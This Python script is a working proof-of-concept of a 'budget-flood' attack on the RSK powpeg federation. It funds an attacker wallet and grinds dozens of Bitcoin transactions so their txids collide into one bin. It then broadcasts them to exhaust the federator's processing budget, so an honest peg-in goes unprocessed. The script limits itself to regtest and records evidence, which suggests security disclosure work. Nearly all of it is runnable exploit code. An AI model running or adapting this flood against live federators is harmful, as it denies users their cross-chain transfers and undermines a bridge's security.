#!/usr/bin/env python3
"""
regtest_attack.py -- run the budget-flood against a REAL rskj + powpeg-node
regtest stack.

Nothing here is a simulation of the node: it broadcasts real Bitcoin
transactions to bitcoind, asks the real powpeg node to run a turn
(`fed_updateBridge`), and reads the real Bridge contract state with `eth_call`.

Prerequisites (see README.md in this directory):
  * bitcoind -regtest running with -txindex and a wallet
  * rskj -regtest running, web3 RPC reachable
  * powpeg-node running as a federator on the same chain
  * a RETIRING federation must be live, i.e. the chain must be inside a
    federation change (the script tells you how to check)

Usage:
  python3 regtest_attack.py \
      --btc-rpc http://127.0.0.1:18332 --btc-user rsk --btc-pass rsk \
      --rsk-rpc http://127.0.0.1:4444 \
      --node-log ~/powpeg-proof/rskj/logs/rsk.log \
      --count 40 --per-child 702000

Exit codes: 0 = the on-chain evidence was produced, 2 = preconditions missing.
"""

import argparse
import base64
import json
import os
import sys
import time
import urllib.request

HERE = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, os.path.join(HERE, "..", "poc"))

from gen_attack_txs import (  # noqa: E402
    MIN_PEGIN_SAT, RETIRING_SAT, PrivateKey, b58check, dsha, hash160,
    p2pkh, ser_tx, sighash_all, vi, bin_index, chm_spread,
)

BRIDGE = "0x0000000000000000000000000000000001000006"
REPORT = []


def say(line=""):
    print(line, flush=True)
    REPORT.append(line)


# ---------------------------------------------------------------------------
# keccak-256 (pure python; needed for ABI selectors, hashlib has no keccak)
# ---------------------------------------------------------------------------

_RC = [0x0000000000000001, 0x0000000000008082, 0x800000000000808A, 0x8000000080008000,
       0x000000000000808B, 0x0000000080000001, 0x8000000080008081, 0x8000000000008009,
       0x000000000000008A, 0x0000000000000088, 0x0000000080008009, 0x000000008000000A,
       0x000000008000808B, 0x800000000000008B, 0x8000000000008089, 0x8000000000008003,
       0x8000000000008002, 0x8000000000000080, 0x000000000000800A, 0x800000008000000A,
       0x8000000080008081, 0x8000000000008080, 0x0000000080000001, 0x8000000080008008]
_ROT = [[0, 36, 3, 41, 18], [1, 44, 10, 45, 2], [62, 6, 43, 15, 61],
        [28, 55, 25, 21, 56], [27, 20, 39, 8, 14]]
_M = (1 << 64) - 1


def _keccak_f(a):
    for rnd in range(24):
        c = [a[x][0] ^ a[x][1] ^ a[x][2] ^ a[x][3] ^ a[x][4] for x in range(5)]
        d = [c[(x - 1) % 5] ^ (((c[(x + 1) % 5] << 1) | (c[(x + 1) % 5] >> 63)) & _M)
             for x in range(5)]
        for x in range(5):
            for y in range(5):
                a[x][y] ^= d[x]
        b = [[0] * 5 for _ in range(5)]
        for x in range(5):
            for y in range(5):
                b[y][(2 * x + 3 * y) % 5] = ((a[x][y] << _ROT[x][y]) |
                                             (a[x][y] >> (64 - _ROT[x][y]))) & _M
        for x in range(5):
            for y in range(5):
                a[x][y] = b[x][y] ^ ((~b[(x + 1) % 5][y]) & b[(x + 2) % 5][y] & _M)
        a[0][0] ^= _RC[rnd]
    return a


def keccak256(data: bytes) -> bytes:
    rate = 136
    a = [[0] * 5 for _ in range(5)]
    padded = bytearray(data) + b"\x01"
    while len(padded) % rate:
        padded += b"\x00"
    padded[-1] ^= 0x80
    for off in range(0, len(padded), rate):
        block = padded[off:off + rate]
        for i in range(rate // 8):
            lane = int.from_bytes(block[i * 8:(i + 1) * 8], "little")
            a[i % 5][i // 5] ^= lane
        a = _keccak_f(a)
    out = b""
    for i in range(4):
        out += a[i % 5][i // 5].to_bytes(8, "little")
    return out[:32]


def selector(sig: str) -> str:
    return keccak256(sig.encode()).hex()[:8]


# ---------------------------------------------------------------------------
# JSON-RPC helpers
# ---------------------------------------------------------------------------

def rpc(url, method, params, auth=None, timeout=30):
    body = json.dumps({"jsonrpc": "2.0", "id": 1, "method": method, "params": params}).encode()
    req = urllib.request.Request(url, data=body, headers={"Content-Type": "application/json"})
    if auth:
        req.add_header("Authorization", "Basic " + base64.b64encode(auth.encode()).decode())
    with urllib.request.urlopen(req, timeout=timeout) as fh:
        out = json.loads(fh.read())
    if out.get("error"):
        raise RuntimeError("%s: %s" % (method, out["error"]))
    return out["result"]


class Btc:
    def __init__(self, url, user, pw):
        self.url, self.auth = url, ("%s:%s" % (user, pw)) if user else None

    def __call__(self, method, *params):
        return rpc(self.url, method, list(params), self.auth)


class Rsk:
    def __init__(self, url):
        self.url = url

    def __call__(self, method, *params):
        return rpc(self.url, method, list(params))

    def call(self, data, to=BRIDGE):
        return self("eth_call", {"to": to, "data": data}, "latest")


# ---------------------------------------------------------------------------
# minimal tx helpers on top of ABI results
# ---------------------------------------------------------------------------

def abi_string(hexresult: str) -> str:
    raw = bytes.fromhex(hexresult[2:])
    if len(raw) < 64:
        return ""
    off = int.from_bytes(raw[:32], "big")
    length = int.from_bytes(raw[off:off + 32], "big")
    return raw[off + 32:off + 32 + length].decode(errors="replace")


def abi_bool(hexresult: str) -> bool:
    return int(hexresult[2:], 16) != 0 if hexresult and hexresult != "0x" else False


def btc_address_to_script(addr: str) -> bytes:
    """Only legacy P2PKH/P2SH regtest/mainnet addresses are needed here."""
    raw = b58decode(addr)
    payload, version = raw[:-4], raw[0]
    body = raw[1:-4]
    if version in (0x00, 0x6F):
        return b"\x76\xa9\x14" + body + b"\x88\xac"
    if version in (0x05, 0xC4):
        return b"\xa9\x14" + body + b"\x87"
    raise SystemExit("unsupported address version %d for %s" % (version, addr))


B58 = "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz"


def b58decode(s: str) -> bytes:
    n = 0
    for ch in s:
        n = n * 58 + B58.index(ch)
    full = n.to_bytes((n.bit_length() + 7) // 8, "big")
    pad = len(s) - len(s.lstrip("1"))
    return b"\x00" * pad + full


# ---------------------------------------------------------------------------
# main flow
# ---------------------------------------------------------------------------

def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--btc-rpc", default="http://127.0.0.1:18332")
    ap.add_argument("--btc-user", default="rsk")
    ap.add_argument("--btc-pass", default="rsk")
    ap.add_argument("--rsk-rpc", default="http://127.0.0.1:4444")
    ap.add_argument("--node-log", default="")
    ap.add_argument("--count", type=int, default=40)
    ap.add_argument("--per-child", type=int, default=702_000)
    ap.add_argument("--confirmations", type=int, default=3)   # regtest btc2rsk confirmations
    ap.add_argument("--dry-run", action="store_true")
    ap.add_argument("--self-test", action="store_true",
                    help="check the pure helpers (keccak, ABI, tx building, grinding) without any node")
    args = ap.parse_args()

    if args.self_test:
        return self_test()

    btc = Btc(args.btc_rpc, args.btc_user, args.btc_pass)
    rsk = Rsk(args.rsk_rpc)

    say("=" * 78)
    say("budget-flood against a live regtest stack")
    say("=" * 78)

    # ---- 0. chain sanity -------------------------------------------------
    info = btc("getblockchaininfo")
    say("bitcoind chain: %s  height %d" % (info["chain"], info["blocks"]))
    if info["chain"] != "regtest":
        say("!! this script only touches regtest. refusing to continue.")
        return 2

    # ---- 1. federations --------------------------------------------------
    active = abi_string(rsk.call("0x" + selector("getFederationAddress()")))
    say("active federation  : %s" % (active or "<none>"))
    try:
        retiring = abi_string(rsk.call("0x" + selector("getRetiringFederationAddress()")))
    except RuntimeError as exc:
        retiring = ""
        say("getRetiringFederationAddress() reverted (%s)" % exc)

    if not retiring:
        say()
        say("!! There is no retiring federation on this chain.")
        say("   The trigger needs TWO live federations: the node validates against the one")
        say("   it watches, the Bridge validates against all live ones.  Start a federation")
        say("   change first (see README.md, 'Getting two live federations on regtest'),")
        say("   then re-run this script.  Expected remaining lifetime of the retiring")
        say("   federation on regtest: 150 blocks (FederationRegTestConstants.java:42).")
        return 2
    say("retiring federation: %s" % retiring)

    active_script = btc_address_to_script(active)
    retiring_script = btc_address_to_script(retiring)

    # ---- 2. attacker wallet and funding ---------------------------------
    key = PrivateKey((987654321).to_bytes(32, "big"))
    attacker_pub = key.public_key.format(True)
    attacker_addr = b58check(hash160(attacker_pub), 0x6F)   # regtest P2PKH
    say("attacker address   : %s" % attacker_addr)

    # one branch per attack tx, plus one for the honest peg-in
    needed = (args.count + 1) * args.per_child + 100_000
    fund_btc = needed / 1e8
    say("funding %s with %.8f BTC (needs %d sat) ..." % (attacker_addr, fund_btc, needed))
    if not args.dry_run:
        fund_txid = btc("sendtoaddress", attacker_addr, fund_btc)
        btc("generatetoaddress", 1, btc("getnewaddress"))
        say("funding tx         : %s" % fund_txid)
        raw = btc("getrawtransaction", fund_txid, 1)
        vout = next(v for v in raw["vout"] if v["scriptPubKey"].get("address") == attacker_addr)
        fund_value = int(round(vout["value"] * 1e8))
        fund_script = bytes.fromhex(vout["scriptPubKey"]["hex"])
    else:
        fund_txid, fund_value = "00" * 32, int(fund_btc * 1e8)
        fund_script = p2pkh(attacker_pub)
        say("(dry run: no transaction will be broadcast)")

    # ---- 3. fan out ------------------------------------------------------
    branches = args.count
    outs = [(args.per_child, fund_script)] * (branches + 1)   # +1 for the honest peg-in
    fan = sign_spend(key, bytes.fromhex(fund_txid)[::-1], vout_index(vout) if not args.dry_run else 0,
                     fund_script, outs)
    say("fan-out tx         : %s (%d branches of %d sat)"
        % (fan["txid"][::-1].hex(), branches, args.per_child))

    # ---- 4. attack transactions -----------------------------------------
    attack = []
    for i in range(branches):
        tx = grind(key, fan["txid"], i, args.per_child, active_script, retiring_script, 10, i + 1)
        attack.append(tx)
    say("built %d attack txs (all ground into bin 0): %d/%d"
        % (len(attack), sum(1 for t in attack if bin_index(t["txid"], 0x3FF) == 0), len(attack)))

    # honest peg-in: 500_000 sat to the active federation only
    honest = sign_spend(key, fan["txid"], branches, args.per_child,
                        [(MIN_PEGIN_SAT, active_script)])
    say("honest peg-in tx   : %s (500000 sat -> active federation)"
        % honest["txid"][::-1].hex())

    if args.dry_run:
        say()
        say("dry run complete; nothing was broadcast")
        return 0

    # ---- 5. broadcast ----------------------------------------------------
    btc("sendrawtransaction", fan["raw"].hex())
    btc("generatetoaddress", 1, btc("getnewaddress"))
    for tx in attack:
        btc("sendrawtransaction", tx["raw"].hex())
    btc("sendrawtransaction", honest["raw"].hex())
    btc("generatetoaddress", args.confirmations + 1, btc("getnewaddress"))
    say("broadcast done, %d confirmations mined" % (args.confirmations + 1))

    # ---- 6. let the federator see them, then force a turn ---------------
    say()
    say("waiting 20 s for the federator to pick up the transactions ...")
    time.sleep(20)

    def processed(txid_internal_hex):
        # the Bridge receives the txid as Sha256Hash.getBytes(), i.e. internal
        # (little-endian relative to the display order) byte order
        return abi_bool(rsk.call("0x" + selector("isBtcTxHashAlreadyProcessed(bytes32)")
                                 + txid_internal_hex.rjust(64, "0")))

    t0 = time.time()
    rpc(args.rsk_rpc, "fed_updateBridge", [])
    say("turn 1 forced via fed_updateBridge (%.1fs)" % (time.time() - t0))
    time.sleep(2)
    turn1 = {t["txid"][::-1].hex(): processed(t["txid"].hex()) for t in attack}
    honest1 = processed(honest["txid"].hex())

    rpc(args.rsk_rpc, "fed_updateBridge", [])
    say("turn 2 forced via fed_updateBridge")
    time.sleep(2)
    turn2 = {t["txid"][::-1].hex(): processed(t["txid"].hex()) for t in attack}
    honest2 = processed(honest["txid"].hex())

    # ---- 7. evidence -----------------------------------------------------
    say()
    say("---- on-chain state after two turns ----")
    say("attack txs marked processed : %d/%d (turn 1)  %d/%d (turn 2)"
        % (sum(turn1.values()), len(attack), sum(turn2.values()), len(attack)))
    say("honest peg-in processed     : %s (turn 1)  %s (turn 2)" % (honest1, honest2))
    say("")
    say("expected: attack txs 0/%d (INVALID_AMOUNT never marks them processed),"
        % len(attack))
    say("          honest peg-in still False -> the budget was consumed by the flood.")

    if args.node_log and os.path.exists(args.node_log):
        text = open(args.node_log, errors="replace").read()
        sends = text.count("[sendTx] Will send btc tx")
        say()
        say("---- federator log (%s) ----" % args.node_log)
        say("[sendTx] lines           : %d" % sends)
        say("attack txs mentioned     : %d/%d"
            % (sum(1 for t in attack if t["txid"][::-1].hex() in text), len(attack)))
        say("honest tx mentioned      : %s" % (honest["txid"][::-1].hex() in text))

    out = os.path.join(HERE, "results", "regtest")
    os.makedirs(out, exist_ok=True)
    with open(os.path.join(out, "attack_txs.json"), "w") as fh:
        json.dump({
            "active_federation": active,
            "retiring_federation": retiring,
            "fan_out_txid": fan["txid"][::-1].hex(),
            "attack": [{"txid": t["txid"][::-1].hex(),
                        "bin": bin_index(t["txid"], 0x3FF)} for t in attack],
            "honest": {"txid": honest["txid"][::-1].hex()},
            "turn1_processed": turn1,
            "turn2_processed": turn2,
            "honest_processed_turn1": honest1,
            "honest_processed_turn2": honest2,
        }, fh, indent=1)
    with open(os.path.join(out, "regtest_attack.log"), "w") as fh:
        fh.write("\n".join(REPORT) + "\n")
    say()
    say("evidence written to %s" % out)
    return 0


def self_test():
    ok = True

    def check(name, cond, detail=""):
        nonlocal ok
        ok = ok and cond
        say("%-46s %s %s" % (name, "OK" if cond else "FAIL", detail))

    check("keccak256('') vector",
          keccak256(b"").hex() == "c5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470")
    check("ABI selector transfer(address,uint256)",
          selector("transfer(address,uint256)") == "a9059cbb")
    check("ABI selector getFederationAddress()",
          selector("getFederationAddress()") == "6923fa85")
    check("ABI selector getRetiringFederationAddress()",
          selector("getRetiringFederationAddress()") == "47227286")

    key = PrivateKey((987654321).to_bytes(32, "big"))
    addr = b58check(hash160(key.public_key.format(True)), 0x6F)
    check("regtest P2PKH address encodes/decodes",
          btc_address_to_script(addr) == p2pkh(key.public_key.format(True)), addr)

    script = p2pkh(key.public_key.format(True))
    tx = sign_spend(key, dsha(b"self-test-utxo"), 0, script, [(500_000, script), (2_000, script)])
    check("signed transaction round-trips", dsha(tx["raw"]) == tx["txid"],
          tx["txid"][::-1].hex()[:16] + "...")
    check("attacker key signature verifies", verify_sig(key, tx))

    mask = 0x3FF
    out = [bin_index(grind(key, dsha(b"self-test-fanout"), i, 702_000,
                           script, script, 10, i + 1)["txid"], mask) for i in range(5)]
    check("grinding puts wtxids in bin 0", all(b == 0 for b in out), str(out))
    say()
    say("self-test %s" % ("passed" if ok else "FAILED"))
    return 0 if ok else 1


def verify_sig(key, tx):
    from coincurve import PublicKey
    parsed = parse_single_input(tx["raw"])
    digest = sighash_all([(parsed["prev_txid"], parsed["prev_vout"], b"", 0xFFFFFFFF)],
                         parsed["outs"], 0, parsed["prev_script"])
    return PublicKey(key.public_key.format(True)).verify(parsed["sig"], digest, hasher=None)


def parse_single_input(raw):
    """Minimal parser for the one-input legacy transactions built in this file."""
    pos = 4
    n_in = raw[pos]; pos += 1
    prev_txid = raw[pos:pos + 32]; vout = int.from_bytes(raw[pos + 32:pos + 36], "little"); pos += 36
    slen = raw[pos]; pos += 1
    script_sig = raw[pos:pos + slen]; pos += slen + 4
    n_out = raw[pos]; pos += 1
    outs = []
    for _ in range(n_out):
        value = int.from_bytes(raw[pos:pos + 8], "little"); pos += 8
        olen = raw[pos]; pos += 1
        outs.append((value, raw[pos:pos + olen])); pos += olen
    # <sig> <pub>
    sig_len = script_sig[0]
    sig = script_sig[1:1 + sig_len]
    return {"prev_txid": prev_txid, "prev_vout": vout, "sig": sig[:-1],
            "prev_script": p2pkh(script_sig[1 + sig_len + 1:]), "outs": outs}


def vout_index(vout):
    return vout["n"]


def sign_spend(key, prev_txid, prev_vout, prev_script, outs):
    digest = sighash_all([(prev_txid, prev_vout, b"", 0xFFFFFFFF)], outs, 0, prev_script)
    sig = key.sign(digest, hasher=None) + b"\x01"
    pub = key.public_key.format(True)
    raw = ser_tx([(prev_txid, prev_vout, push_data(sig) + push_data(pub), 0xFFFFFFFF)], outs)
    return {"raw": raw, "txid": dsha(raw)}


def push_data(data: bytes) -> bytes:
    return bytes([len(data)]) + data


def grind(key, fan_txid, index, value, active_script, retiring_script, bits, seed):
    mask = (1 << bits) - 1
    attempt = 0
    while True:
        attempt += 1
        dummy = 546 + ((seed * 2654435761 + attempt * 40503) % 50_000)
        change = value - MIN_PEGIN_SAT - RETIRING_SAT - 1_200 - dummy
        outs = [(MIN_PEGIN_SAT, active_script), (RETIRING_SAT, retiring_script),
                (dummy, p2pkh(key.public_key.format(True))), (change, p2pkh(key.public_key.format(True)))]
        tx = sign_spend(key, fan_txid, index, p2pkh(key.public_key.format(True)), outs)
        if bin_index(tx["txid"], mask) == 0:
            tx["attempts"] = attempt
            return tx


if __name__ == "__main__":
    raise SystemExit(main())
